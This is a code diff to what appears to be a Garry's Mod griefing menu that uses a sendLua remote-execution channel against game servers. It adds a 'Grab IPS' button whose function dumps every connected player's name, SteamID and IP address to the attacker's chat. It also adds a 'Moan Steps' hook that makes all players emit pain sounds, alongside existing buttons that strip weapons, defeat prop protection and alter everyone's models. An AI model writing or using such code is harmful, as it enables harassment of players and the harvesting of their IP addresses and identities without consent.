@@ -692,6 +692,26 @@ end
 function unGodAll() 
 	sendLua([[for k,v in pairs(player.GetAll()) do v:GodDisable() end]]) 
 end 
+	
+function moanSteps()
+sendLua([[if !moanstep then
+	hook.Add("PlayerFootstep", "oooh", function(ply)
+	ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
+	end)
+	moanstep = true
+	else
+	hook.Remove("PlayerFootstep", "oooh")
+	moanstep = false
+	end]])
+end
+function ip()
+	sendLua([[
+	local id = ]] .. LocalPlayer():UserID() .. [[
+	for k, v in pairs( player.GetAll() ) do 
+	Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
+	end
+	]])
+end
 
 --[[------------------------------------------------------------------------- Tab 2 Functions ---------------------------------------------------------------------------]] 
 /* Songs */
@@ -816,6 +836,8 @@ ambush.Button("Fuck FPP", tab2VisList, fuckFPP, "Run console command.")
 ambush.Button("Strip Weapons", tab2VisList, removeAll, "Run console command.") 
 
 /* Player */ 
+ambush.Button("Grab IPS", tab3VisList, ip, "")
+ambush.Button("Moan Steps", tab3VisList, moanSteps, "")
 ambush.Button("Change Models", tab3VisList, changeModels, "Changes everyone's model.") 
 ambush.Button("Spam Models", tab3VisList, spamModels, "Changes everyone's model a lot.") 
 ambush.Button("Change Size", tab3VisList, changeSize, "Makes everyone big asf.") 
